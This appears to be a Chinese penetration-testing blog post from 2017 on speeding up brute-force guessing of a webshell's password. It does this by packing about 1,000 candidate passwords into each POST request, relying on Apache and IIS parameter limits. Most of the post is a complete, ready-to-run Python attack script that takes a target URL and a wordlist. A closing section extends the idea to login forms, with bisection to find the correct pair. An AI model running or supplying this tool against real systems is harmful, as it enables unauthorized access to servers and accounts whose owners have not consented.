---
draft: false
date: 2017-02-17 10:32:24
title: 利用多参数提高 webshell 爆破速度
description: 
categories:
  - Pentest
tags:
  - 爆破
---

### 0x00 原理
之前在[https://www.t00ls.net/viewthread.php?tid=36985](https://www.t00ls.net/viewthread.php?tid=36985)看到这个思路的。

Apache下默认同时允许接收1000个参数；IIS下默认同时允许接收5883个参数，可以一次提交多个密码，从而快速爆破。

### 0x01 爆破webshell代码
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# code by reber <1070018473@qq.com>

import sys
import requests

proxy = {'http':'http://127.0.0.1:8080'}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def get_file(filename):
    data = []
    with open(filename,'r') as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def get_payloads(data):
    payloads = []
    for x in xrange(0,10):
        print x*1000,(x+1)*1000
        payload = []
        for y in data[x*1000:(x+1)*1000]:
            payload.append("%s=echo '%s';" % (y,y))
        payloads.append('&'.join(payload))
    return payloads

def run(url, payloads):
    for payload in payloads:
        resp = requests.post(url=url,data=payload,headers=headers)
        print resp.content

if __name__ == '__main__':
    url = sys.argv[1]
    filename = sys.argv[2]

    data = get_file(filename)
    payloads = get_payloads(data)
    run(url, payloads)
```
![](/img/post/blasting_webshell.png)

### 0x02 猜想
平时爆破表单时都是一次提交一个payload，比如说```username='xxx'&password='xxx'```，10w个组合需要提交10w次，若一次提交500个组合则只需要提交200次

我们可以直接一次提交500个payload，如：name='111'&pass='111'&name='112'&pass='112'&name='113'&pass='113'& 。。。。。。(500个payload)

如果正确的密码在你测试的某1000个参数中，那么返回页面的是不同的，则可以断定正确的用户名和密码在这1000个参数里，然后对这1000个参数用二分法再次进行测试，直到得到正确的用户名和密码
